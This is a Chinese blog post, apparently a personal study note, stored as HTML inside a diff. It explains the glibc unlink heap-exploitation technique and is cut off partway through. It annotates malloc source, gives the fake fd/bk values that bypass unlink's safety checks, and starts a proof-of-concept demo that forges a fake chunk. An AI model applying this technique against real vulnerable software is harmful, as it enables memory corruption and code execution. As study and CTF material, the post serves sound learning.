@@ -1,0 +1,639 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="堆学习,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mutou-jun's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="最近总是觉得 堆的好多知识点都稍微有些了解，但却根本不能善于 去利用他们， 感觉是件很可怕的事，于是打算 重新再学一次，尽量将原理解透彻！这次就 学习下 unlink。一般只在不开启 pie 和full relro 的情况下使用。且有一个全局 变量地址。">
+<meta name="keywords" content="堆学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink 再学习及unlink_hitcon2014_stkof题解">
+<meta property="og:url" content="http://yoursite.com/2020/04/28/unlink 再学习及unlink_hitcon2014_stkof题解/index.html">
+<meta property="og:site_name" content="mutou-jun&#39;s blog">
+<meta property="og:description" content="最近总是觉得 堆的好多知识点都稍微有些了解，但却根本不能善于 去利用他们， 感觉是件很可怕的事，于是打算 重新再学一次，尽量将原理解透彻！这次就 学习下 unlink。一般只在不开启 pie 和full relro 的情况下使用。且有一个全局 变量地址。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-04-28T16:48:55.563Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="unlink 再学习及unlink_hitcon2014_stkof题解">
+<meta name="twitter:description" content="最近总是觉得 堆的好多知识点都稍微有些了解，但却根本不能善于 去利用他们， 感觉是件很可怕的事，于是打算 重新再学一次，尽量将原理解透彻！这次就 学习下 unlink。一般只在不开启 pie 和full relro 的情况下使用。且有一个全局 变量地址。">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"right","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> unlink 再学习及unlink_hitcon2014_stkof题解 | mutou-jun's blog </title>
+</head>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">mutou-jun's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                unlink 再学习及unlink_hitcon2014_stkof题解
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2020-04-28T23:12:15+08:00" content="2020-04-28">
+              2020-04-28
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近总是觉得 堆的好多知识点都稍微有些了解，但却根本不能善于 去利用他们， 感觉是件很可怕的事，于是打算 重新再学一次，尽量将原理解透彻！<br>这次就 学习下 unlink。<br>一般只在不开启 pie 和full relro 的情况下使用。且有一个全局 变量地址。</p>
+<a id="more"></a>
+<h1 id="unlink相关源码："><a href="#unlink相关源码：" class="headerlink" title="unlink相关源码："></a>unlink相关源码：</h1><p>源码中 变量：<br>p ：当前要free的 chunk<br>size:当前 chunk_size</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/*</span> <span class="string">consolidate</span> <span class="string">backward</span> <span class="string">向后合并</span>    <span class="string">其中向后合并也是最常见的类型*/</span>         </span><br><span class="line"><span class="number">4277</span>            <span class="string">if</span> <span class="string">(!prev_inuse(p))</span> <span class="string">&#123;</span>      <span class="string">//如果当前chunk前一个chunk是free的</span></span><br><span class="line"><span class="number">4278</span>              <span class="string">prevsize</span> <span class="string">=</span> <span class="string">prev_size</span> <span class="string">(p);//取得前一个chunk的size</span></span><br><span class="line"><span class="number">4279</span>              <span class="string">size</span> <span class="string">+=</span> <span class="string">prevsize;</span>        <span class="string">//当前chunk的size</span> <span class="string">等于它加上</span> <span class="string">上一个chunk的size</span></span><br><span class="line"><span class="number">4280</span>              <span class="string">p</span> <span class="string">=</span> <span class="string">chunk_at_offset(p,</span> <span class="string">-((long)</span> <span class="string">prevsize));//根据当前chunk的prevsize去得到上一个chunk</span></span><br><span class="line"><span class="number">4281</span>              <span class="string">unlink(av,</span> <span class="string">p,</span> <span class="string">bck,</span> <span class="string">fwd);</span> <span class="string">//unlink</span> <span class="string">上一个chunk</span></span><br><span class="line"><span class="number">4282</span>            <span class="string">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="number">4283</span>        </span><br><span class="line"><span class="number">4284</span>            <span class="string">if</span> <span class="string">(nextchunk</span> <span class="string">!=</span> <span class="string">av-&gt;top)</span> <span class="string">&#123;</span>  <span class="string">//如果下一个chunk</span> <span class="string">不是top</span> <span class="string">chunk</span></span><br><span class="line"><span class="number">4285</span>              <span class="string">/*</span> <span class="string">get</span> <span class="string">and</span> <span class="string">clear</span> <span class="string">inuse</span> <span class="string">bit</span> <span class="string">*/</span></span><br><span class="line"><span class="number">4286</span>              <span class="string">nextinuse</span> <span class="string">=</span> <span class="string">inuse_bit_at_offset(nextchunk,</span> <span class="string">nextsize);//取得下一个chunk的的</span> <span class="string">size</span> <span class="string">的inuse位</span></span><br><span class="line"><span class="number">4287</span>        </span><br><span class="line"><span class="number">4288</span>              <span class="string">/*</span> <span class="string">consolidate</span> <span class="string">forward</span>  <span class="string">向前合并</span> <span class="string">*/</span></span><br><span class="line"><span class="number">4289</span>              <span class="string">if</span> <span class="string">(!nextinuse)</span> <span class="string">&#123;</span>     <span class="string">//如果下一个chunk的size的inuse</span> <span class="string">是</span> <span class="number">0</span><span class="string">即</span> <span class="string">该chunk</span> <span class="string">是</span> <span class="string">free</span> <span class="string">的话。</span></span><br><span class="line"><span class="number">4290</span>                <span class="string">unlink(av,</span> <span class="string">nextchunk,</span> <span class="string">bck,</span> <span class="string">fwd);</span>  <span class="string">/便将</span> <span class="string">下一个chunk</span> <span class="string">进行</span> <span class="string">unlink</span></span><br><span class="line"><span class="number">4291</span>                <span class="string">size</span> <span class="string">+=</span> <span class="string">nextsize;</span>                 <span class="string">//当前</span> <span class="string">size</span> <span class="string">等于</span> <span class="string">再加上</span> <span class="string">下一个</span> <span class="string">chunk的size</span> </span><br><span class="line"><span class="number">4292</span>              <span class="string">&#125;</span> <span class="string">else</span></span><br><span class="line"><span class="number">4293</span>                <span class="string">clear_inuse_bit_at_offset(nextchunk,</span> <span class="number">0</span><span class="string">);</span>  <span class="string">//如果下一个chunk不是free，则将的prev_size的inuse由</span> <span class="number">1</span><span class="string">-&gt;0</span> </span><br><span class="line"><span class="number">4294</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4295</span>              <span class="string">/*</span> <span class="string">后面这部分</span></span><br><span class="line"><span class="number">4296</span>                <span class="string">Place</span> <span class="string">the</span> <span class="string">chunk</span> <span class="string">in</span> <span class="string">unsorted</span> <span class="string">chunk</span> <span class="string">list.</span> <span class="string">Chunks</span> <span class="string">are</span></span><br><span class="line"><span class="number">4297</span>                <span class="string">not</span> <span class="string">placed</span> <span class="string">into</span> <span class="string">regular</span> <span class="string">bins</span> <span class="string">until</span> <span class="string">after</span> <span class="string">they</span> <span class="string">have</span></span><br><span class="line"><span class="number">4298</span>                <span class="string">been</span> <span class="string">given</span> <span class="string">one</span> <span class="string">chance</span> <span class="string">to</span> <span class="string">be</span> <span class="string">used</span> <span class="string">in</span> <span class="string">malloc.</span></span><br><span class="line"></span><br><span class="line">                    <span class="string">将</span> <span class="string">chunk</span> <span class="string">放入ubsigned</span> <span class="string">bin</span> <span class="string">中。</span> <span class="string">chunk是</span></span><br><span class="line">                    <span class="string">直到它们放入后才放入常规bin</span> <span class="string">中</span></span><br><span class="line">                    <span class="string">获得了一次在malloc中使用的机会。</span></span><br><span class="line"><span class="number">4299</span>              <span class="string">*/</span></span><br><span class="line"><span class="number">4300</span>        </span><br><span class="line">                    <span class="string">//整理chunk</span> <span class="string">结构放入</span> <span class="string">unsorted</span> <span class="string">bin</span> <span class="string">中</span></span><br><span class="line">                    <span class="string">//将合并好的</span> <span class="string">chunk</span> <span class="string">加入到</span> <span class="string">unsorted</span> <span class="string">bin，如果属于</span> <span class="string">small</span> <span class="string">chunk的话</span> <span class="string">是没有</span> <span class="string">fd_nextsize和bk_nextsize的</span></span><br><span class="line">                    <span class="string">//然后</span> <span class="string">设置</span> <span class="string">合并后的</span> <span class="string">chunk的</span> <span class="string">头部</span></span><br><span class="line">                    <span class="string">//设置合并后的size，合并chunk的下一个chunk的</span> <span class="string">prev_size.</span></span><br><span class="line">                    </span><br><span class="line"><span class="number">4301</span>              <span class="string">bck</span> <span class="string">=</span> <span class="string">unsorted_chunks(av);</span></span><br><span class="line"><span class="number">4302</span>              <span class="string">fwd</span> <span class="string">=</span> <span class="string">bck-&gt;fd;</span></span><br><span class="line"><span class="number">4303</span>              <span class="string">if</span> <span class="string">(__glibc_unlikely</span> <span class="string">(fwd-&gt;bk</span> <span class="string">!=</span> <span class="string">bck))</span></span><br><span class="line"><span class="number">4304</span>                <span class="string">malloc_printerr</span> <span class="string">("free():</span> <span class="string">corrupted</span> <span class="string">unsorted</span> <span class="string">chunks");</span></span><br><span class="line"><span class="number">4305</span>              <span class="string">p-&gt;fd</span> <span class="string">=</span> <span class="string">fwd;</span></span><br><span class="line"><span class="number">4306</span>              <span class="string">p-&gt;bk</span> <span class="string">=</span> <span class="string">bck;</span></span><br><span class="line"><span class="number">4307</span>              <span class="string">if</span> <span class="string">(!in_smallbin_range(size))</span></span><br><span class="line"><span class="number">4308</span>                <span class="string">&#123;</span></span><br><span class="line"><span class="number">4309</span>                  <span class="string">p-&gt;fd_nextsize</span> <span class="string">=</span> <span class="literal">NULL</span><span class="string">;</span></span><br><span class="line"><span class="number">4310</span>                  <span class="string">p-&gt;bk_nextsize</span> <span class="string">=</span> <span class="literal">NULL</span><span class="string">;</span></span><br><span class="line"><span class="number">4311</span>                <span class="string">&#125;</span></span><br><span class="line"><span class="number">4312</span>              <span class="string">bck-&gt;fd</span> <span class="string">=</span> <span class="string">p;</span></span><br><span class="line"><span class="number">4313</span>              <span class="string">fwd-&gt;bk</span> <span class="string">=</span> <span class="string">p;</span></span><br><span class="line"><span class="number">4314</span>        </span><br><span class="line"><span class="number">4315</span>              <span class="string">set_head(p,</span> <span class="string">size</span> <span class="string">|</span> <span class="string">PREV_INUSE);</span></span><br><span class="line"><span class="number">4316</span>              <span class="string">set_foot(p,</span> <span class="string">size);</span></span><br><span class="line"><span class="number">4317</span>        </span><br><span class="line"><span class="number">4318</span>              <span class="string">check_free_chunk(av,</span> <span class="string">p);</span></span><br><span class="line"><span class="number">4319</span>            <span class="string">&#125;</span></span><br><span class="line"><span class="number">4320</span>        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4321</span>            <span class="string">/*</span></span><br><span class="line"><span class="number">4322</span>              <span class="string">If</span> <span class="string">the</span> <span class="string">chunk</span> <span class="string">borders</span> <span class="string">the</span> <span class="string">current</span> <span class="string">high</span> <span class="string">end</span> <span class="string">of</span> <span class="string">memory,</span></span><br><span class="line"><span class="number">4323</span>              <span class="string">consolidate</span> <span class="string">into</span> <span class="string">top</span></span><br><span class="line"><span class="number">4324</span>            <span class="string">*/</span></span><br><span class="line"><span class="number">4325</span>        </span><br><span class="line"><span class="number">4326</span>            <span class="string">else</span> <span class="string">&#123;</span></span><br><span class="line"><span class="number">4327</span>              <span class="string">size</span> <span class="string">+=</span> <span class="string">nextsize;</span></span><br><span class="line"><span class="number">4328</span>              <span class="string">set_head(p,</span> <span class="string">size</span> <span class="string">|</span> <span class="string">PREV_INUSE);</span></span><br><span class="line"><span class="number">4329</span>              <span class="string">av-&gt;top</span> <span class="string">=</span> <span class="string">p;</span></span><br><span class="line"><span class="number">4330</span>              <span class="string">check_chunk(av,</span> <span class="string">p);</span></span><br><span class="line"><span class="number">4331</span>            <span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="unlink-："><a href="#unlink-：" class="headerlink" title="unlink ："></a>unlink ：</h1><p>放一个 ctfwiki上的经典图示：<br>==图片==<br>很是类似双链表的 卸 块吧。<br>看unlink 宏的实现源码：</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            </span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))<span class="comment">//如果 该chunk的size 和 下一个chunk 的prev_size相等的话。   </span></span><br><span class="line">              malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);           <span class="comment">// 会爆错："corrupted size vs. prev_size"        </span></span><br><span class="line">               <span class="comment">//绕过姿势: 修改使得  该chunk的size 和 下一个chunk 的prev_size相等 即可 </span></span><br><span class="line">            FD = P-&gt;fd;    <span class="comment">//FD=p+0x10                                                                     </span></span><br><span class="line">            BK = P-&gt;bk;    <span class="comment">//BK=p+0x18                                                                  </span></span><br><span class="line">            <span class="function"><span class="title">if</span> (__builtin_expect (FD-&gt;</span><span class="function"><span class="title">bk</span> != P || BK-&gt;</span>fd != P, <span class="number">0</span>)) <span class="comment">//如果 *(*(p+0x10) +0x18) 不是p 或者*(*(p+0x18)+0x10)不是 p                    </span></span><br><span class="line">              malloc_printerr (<span class="string">"corrupted double-linked list"</span>);   <span class="comment">// 会爆错："corrupted double-linked list"</span></span><br><span class="line">              <span class="comment">//绕过姿势:  我们使   *(p+0x10)是  &amp;p-0x18 ；*(p+0x18)是 &amp;p-0x10</span></span><br><span class="line">                          即            FD ==  &amp;p-<span class="number">0</span>x18       BK==  &amp;p-<span class="number">0</span>x10 </span><br><span class="line">                          </span><br><span class="line">                                                                                                      </span><br><span class="line">            <span class="keyword">else</span> &#123;              <span class="comment">//以下两行为 unlink的关键 ，正常的话就是 进行上面图示的操作</span></span><br><span class="line">                                <span class="comment">//而我们是要利用，就用  为了绕过上面检测 用的FD 和BK 吧。</span></span><br><span class="line">                                <span class="comment">//     FD = P-&gt;fd;    //即 FD=p+0x10                                                                     </span></span><br><span class="line">                                <span class="comment">//     BK = P-&gt;bk;    //即 BK=p+0x18    </span></span><br><span class="line">                               <span class="comment">//绕过姿势:  我们使  *(p+0x10)是  &amp;p-0x18 ；*(p+0x18)是 &amp;p-0x10</span></span><br><span class="line">                               <span class="comment">//        即          FD ==  &amp;p-0x18            BK==  &amp;p-0x10       </span></span><br><span class="line">                                                                               </span><br><span class="line">                FD-&gt;bk = BK;     <span class="comment">// FD+0x18=&amp;p-0x10    即*(*(p-0x18)+0x18)=&amp;p-0x10                                              </span></span><br><span class="line">                BK-&gt;fd = FD;     <span class="comment">// BK+0x10=&amp;p-0x18    即*(*(p-0x10)+0x10)=&amp;p-0x18    //关键 </span></span><br><span class="line">                </span><br><span class="line">                            <span class="comment">//所以 攻击后，FD</span></span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="comment">//下面的就不重要，攻击的话 一般不会使用 largh chunk的。就不做分析了。</span></span><br><span class="line">                                                                                                                </span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                             </span><br><span class="line">                    &amp;&amp; __<span class="function"><span class="title">builtin_expect</span> (P-&gt;</span>fd_nextsize != NULL, <span class="number">0</span>)) &#123;                      </span><br><span class="line">                    <span class="function"><span class="title">if</span> (__builtin_expect (P-&gt;</span><span class="function"><span class="title">fd_nextsize</span>-&gt;</span>bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                        || __<span class="function"><span class="title">builtin_expect</span> (P-&gt;</span><span class="function"><span class="title">bk_nextsize</span>-&gt;</span>fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">                      malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);   </span><br><span class="line">                    <span class="function"><span class="title">if</span> (FD-&gt;</span>fd_nextsize == NULL) &#123;                                      </span><br><span class="line">                        <span class="function"><span class="title">if</span> (P-&gt;</span>fd_nextsize == P)                                      </span><br><span class="line">                          FD-&gt;<span class="function"><span class="title">fd_nextsize</span> = FD-&gt;</span>bk_nextsize = FD;                      </span><br><span class="line">                        <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                            FD-&gt;<span class="function"><span class="title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;                              </span><br><span class="line">                            FD-&gt;<span class="function"><span class="title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;                              </span><br><span class="line">                            P-&gt;<span class="function"><span class="title">fd_nextsize</span>-&gt;</span>bk_nextsize = FD;                              </span><br><span class="line">                            P-&gt;<span class="function"><span class="title">bk_nextsize</span>-&gt;</span>fd_nextsize = FD;                              </span><br><span class="line">                          &#125;                                                              </span><br><span class="line">                      &#125; <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                        P-&gt;<span class="function"><span class="title">fd_nextsize</span>-&gt;</span><span class="function"><span class="title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;                      </span><br><span class="line">                        P-&gt;<span class="function"><span class="title">bk_nextsize</span>-&gt;</span><span class="function"><span class="title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;                      </span><br><span class="line">                      &#125;                                                                                   &#125;                                                                      \</span><br><span class="line">              &#125;                                                                              </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们来debug 下：<br>这里以 i春秋的 demo来具体 了解下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">//gcc</span> <span class="string">-g</span> <span class="string">demo.c</span> <span class="string">-no-pie</span> <span class="string">-o</span> <span class="string">demo</span></span><br><span class="line"><span class="string">struct</span> <span class="string">chunk_structure</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">size_t</span> <span class="string">prev_size;</span></span><br><span class="line">  <span class="string">size_t</span> <span class="string">size;</span></span><br><span class="line">  <span class="string">struct</span> <span class="string">chunk_structure</span> <span class="string">*fd;</span></span><br><span class="line">  <span class="string">struct</span> <span class="string">chunk_structure</span> <span class="string">*bk;</span></span><br><span class="line">  <span class="string">char</span> <span class="string">buf[10];</span>               <span class="string">//</span> <span class="string">padding</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">int</span> <span class="string">main()</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">unsigned</span> <span class="string">long</span> <span class="string">long</span> <span class="string">*chunk1,</span> <span class="string">*chunk2;</span></span><br><span class="line">  <span class="string">struct</span> <span class="string">chunk_structure</span> <span class="string">*fake_chunk,</span> <span class="string">*chunk2_hdr;</span></span><br><span class="line">  <span class="string">char</span> <span class="string">data[20];</span></span><br><span class="line"> </span><br><span class="line">  <span class="string">//首先申请两个</span> <span class="string">不是</span> <span class="string">fast</span> <span class="string">的chunk</span></span><br><span class="line">  <span class="string">chunk1</span> <span class="string">=</span> <span class="string">malloc(0x80);</span></span><br><span class="line">  <span class="string">chunk2</span> <span class="string">=</span> <span class="string">malloc(0x80);</span></span><br><span class="line">  <span class="string">printf("%p\n",</span> <span class="string">&amp;chunk1);</span>            <span class="string">//0x7fffffffdcb0</span></span><br><span class="line">  <span class="string">printf("%p\n",</span> <span class="string">chunk1);</span>             <span class="string">//0x602010</span></span><br><span class="line">  <span class="string">printf("%p\n",</span> <span class="string">chunk2);</span>             <span class="string">//0x6020a0</span></span><br><span class="line"><span class="string">//假设攻击者可以控制了chunk1的内容</span></span><br><span class="line"><span class="string">//溢出堆，覆盖chunk2的头</span></span><br><span class="line"><span class="string">//首先从chunk1开始伪造一个假块</span></span><br><span class="line"><span class="string">//需要设置fd和bk指针通过unlink安全检查</span></span><br><span class="line">  <span class="string">fake_chunk</span> <span class="string">=</span> <span class="string">(struct</span> <span class="string">chunk_structure</span> <span class="string">*)chunk1;</span>             <span class="string">//伪造</span> <span class="string">chunk</span> <span class="string">：0x7fffffffdcc0</span> <span class="string">—▸</span> <span class="number">0x602010</span><span class="string">&lt;-0</span>    <span class="string">//这里</span> <span class="string">&amp;chunk1_mem:</span> <span class="number">0x7fffffffdcb0</span> <span class="string">—▸</span> <span class="number">0x602010</span> <span class="string">◂—</span> <span class="number">0x0</span></span><br><span class="line">                                                             <span class="string">//</span> <span class="string">即</span> <span class="string">指向</span>  <span class="number">0x602010</span> <span class="string">这个伪造chunk的</span> <span 